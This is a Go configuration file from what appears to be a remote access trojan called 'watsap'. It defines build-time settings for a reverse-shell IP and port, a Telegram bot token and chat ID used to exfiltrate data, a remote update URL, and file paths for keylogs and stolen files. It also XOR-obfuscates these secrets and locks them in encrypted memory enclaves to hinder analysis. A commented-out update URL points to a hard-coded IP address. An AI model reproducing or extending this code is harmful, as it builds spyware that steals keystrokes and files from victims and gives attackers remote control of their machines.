package config

import (
	"encoding/hex"
	"path"
	"runtime"
	"watsap/utils/files"

	"github.com/awnumar/memguard"
)

// Variables
var (
	Platform  = runtime.GOOS
	WaVersion = "11.00"
	FirstRun  = !files.Exists(DataFile)
	UserID    *string
)

// variables will be loaded from ldflags
var (
	TG_BOT_TOKEN_HEX string
	TG_CHAT_ID_HEX   string
	RSHELL_IP        string
	RSHELL_PORT      string
	UPDATE_URL       string
	CERT_PATH        string
	DEBUG_STATUS     string
	LOG_STATUS       string
)

// In-memory enclaves (Memguard)
var (
	BotTokenEnclave *memguard.Enclave
	ChatIDEnclave   *memguard.Enclave
)

var DebugMode = false
var WaLogging = false
var CertPath = "cert.pem"

// Files & dirs
var (
	WaDir      = path.Join(waDirPrefix, "watsap")
	InitFile   = path.Join(WaDir, "init.w")
	GeoFile    = path.Join(WaDir, "geoip.w")
	DataFile   = path.Join(WaDir, "data.w")
	KeylogFile = path.Join(WaDir, "kl.w")
	FilesDir   = path.Join(WaDir, "files")
	LogFile    = path.Join(WaDir, "log.w")
	UpdateFile = path.Join(WaDir, "update.json")
	//UpdateURL  = "http://192.3.159.189:8080/watsap.json"
)

// Telegram stuff
var (
	TgBotAPIBytes     = []byte("https://api.telegram.org/bot")
	TgFileApiURLBytes = []byte("/sendDocument")
)

func WipeMemory(data []byte) {
	for i := range data {
		data[i] = 0
	}
}

// Decode helper using XOR hex
func decodeXORHex(encodedHex string) []byte {
	decodedBytes, err := hex.DecodeString(encodedHex)
	if err != nil {
		return nil
	}
	for i := range decodedBytes {
		decodedBytes[i] ^= 0x57
	}
	return decodedBytes
}

func InitConfig() {
	if DEBUG_STATUS == "true" {
		DebugMode = true
	}
	if LOG_STATUS == "true" {
		WaLogging = true
	}

	// Safely listen for interrupts and purge enclaves on exit
	memguard.CatchInterrupt()

	// Decode into temp buffers
	tmpToken := decodeXORHex(TG_BOT_TOKEN_HEX)
	tmpChatID := decodeXORHex(TG_CHAT_ID_HEX)

	// Clear global string variables so they don't remain in memory
	TG_BOT_TOKEN_HEX = ""
	TG_CHAT_ID_HEX = ""

	// Create Memguard buffers
	tokenBuf := memguard.NewBufferFromBytes(tmpToken)
	chatIDBuf := memguard.NewBufferFromBytes(tmpChatID)

	// Wipe temp buffers manually (NewBufferFromBytes doesn't zero the original slice)
	WipeMemory(tmpToken)
	WipeMemory(tmpChatID)

	// Seal into enclaves (locks and encrypts)
	BotTokenEnclave = tokenBuf.Seal()
	ChatIDEnclave = chatIDBuf.Seal()
}
/*
func Printvar() {
	fmt.Println(TG_BOT_TOKEN)
	fmt.Println(TG_CHAT_ID)
	fmt.Println(RSHELL_IP)
	fmt.Println(RSHELL_PORT)
}
*/
